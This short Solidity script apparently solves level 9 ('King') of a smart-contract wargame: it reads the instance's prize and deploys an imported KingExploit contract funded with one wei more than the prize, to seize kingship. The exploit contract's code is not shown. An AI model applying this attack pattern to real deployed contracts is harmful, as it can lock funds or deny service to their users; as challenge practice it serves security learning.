// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IKing.sol";
import "../src/exploits/KingExploit.sol";

contract SolveLevel9 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x27bC920e7C426500a0e7D63Bb037800A7288abC1;
        value = 0.001 ether;
    }

    function solveLevel(address instanceAddress) internal override {
        IKing instance = IKing(payable(instanceAddress));

        uint256 prize = instance.prize();
        KingExploit exploit = new KingExploit{value: prize + 1}(instance);
    }
}
